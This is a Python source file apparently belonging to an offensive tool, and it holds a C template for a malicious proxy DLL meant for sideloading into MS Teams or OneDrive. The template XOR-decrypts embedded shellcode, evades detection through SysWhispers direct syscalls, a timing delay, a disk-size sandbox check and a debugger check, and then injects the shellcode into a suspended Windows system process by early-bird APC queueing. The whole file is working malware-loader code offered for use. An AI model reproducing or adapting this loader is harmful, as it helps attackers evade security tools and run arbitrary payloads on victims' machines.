from Read_Shellcode import *
from Split_Xor_Shellcode import ciphertext_split

# here we specify the DLL skeleton 
c_template = f"""
#include <stdio.h>
#include <stdlib.h>
#include "syscalls.h"

#define _CRT_SECURE_NO_DEPRECATE

#pragma warning (disable : 4996)


//Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
//We must use sharpdllproxy to auto make us a C file which will include all this exports.
//In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls

//here DLL exports are specified based an the user choice either MS Teams || OneDrive

{file_contents}


BOOL executed = FALSE;

//xor decryption
void {xor_func}(unsigned char* data, size_t data_len, char* key, size_t key_len)
{{
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++)
    {{
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }}
}};

/*
Timing attack using waitable timers. Test fails if any of the calls return an error state.
*/
BOOL timing_CreateWaitableTimer(UINT delayInMillis)
{{
    HANDLE hTimer;
    LARGE_INTEGER dueTime;

    BOOL bResult = FALSE;

    dueTime.QuadPart = delayInMillis * -10000LL;

    hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

    if (hTimer == NULL)
    {{
        return TRUE;
    }}

    if (SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE) == FALSE)
    {{
        bResult = TRUE;
    }}
    else {{
        if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0)
        {{
            bResult = TRUE;
        }}
    }}

    CancelWaitableTimer(hTimer);
    CloseHandle(hTimer);
    return bResult;
}}
//sandbox check to check hardrive 
int gensandbox_drive_size() {{
    GET_LENGTH_INFORMATION size;
    DWORD lpBytesReturned;

    HANDLE drive = CreateFile(L"\\\\\\\.\\\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (drive == INVALID_HANDLE_VALUE) {{
        // Someone is playing tricks. Or not {shellcode_var} enough privileges.
        CloseHandle(drive);
        return FALSE;
    }}
    BOOL result = DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytesReturned, NULL);
    CloseHandle(drive);

    if (result != 0) {{
        if (size.Length.QuadPart / 1073741824 <= 60) /* <= 60 GB */
            return TRUE;
    }}

    return FALSE;
}}


DWORD WINAPI DoMagic(LPVOID lpParameter)
{{

    unsigned char {shellcode_var}[] = {ciphertext_split}

    if (!executed)
    {{

        executed = TRUE;

        LPVOID allocation_start;
        SIZE_T allocation_size = sizeof({shellcode_var});
        NTSTATUS status = NULL;

        allocation_start = nullptr;

        char {key_var}[] = "{key_hex}";

        STARTUPINFOA si = {{ 0 }};
        PROCESS_INFORMATION pi = {{ 0 }};

        CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        HANDLE victimProcess = pi.hProcess;
        HANDLE threadHandle = pi.hThread;
        //delay execution
        timing_CreateWaitableTimer({time});

                    /*++

            Routine Description:

                CheckRemoteDebuggerPresent() is another Win32 Debugging API function;
                it can be used to check if a remote process is being debugged. However,
                we can also use this as another method for checking if our own process
                is being debugged. This API internally calls the NTDLL export
                NtQueryInformationProcess function with the PROCESSINFOCLASS set to
                7 (ProcessDebugPort).

            Arguments:
                None
            Return Value:

                TRUE - if debugger was detected
                FALSE - otherwise
            --*/
        BOOL bIsDbgPresent = FALSE;
        DWORD oldProtect= NULL;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
        // Allocate Virtual Memory 
        NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        {xor_func}({shellcode_var}, sizeof({shellcode_var}), {key_var}, sizeof({key_var}));
        // Copy shellcode into allocated memory
        NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
        NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);

        NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
        NtResumeThread(threadHandle, NULL);
        return 0;
    }}
}}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{{
  LPVOID allocation_start;
    HANDLE hThread;
    allocation_start = nullptr;
    //HANDLE threadHandle;
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH:

        //sandbox check for harddisk size
        gensandbox_drive_size();

    
        hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(hThread);
        


    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        //sleep for 5 secs when  the process will be detached
        Sleep(5000);
        break;
    }}
    return TRUE;
}}

"""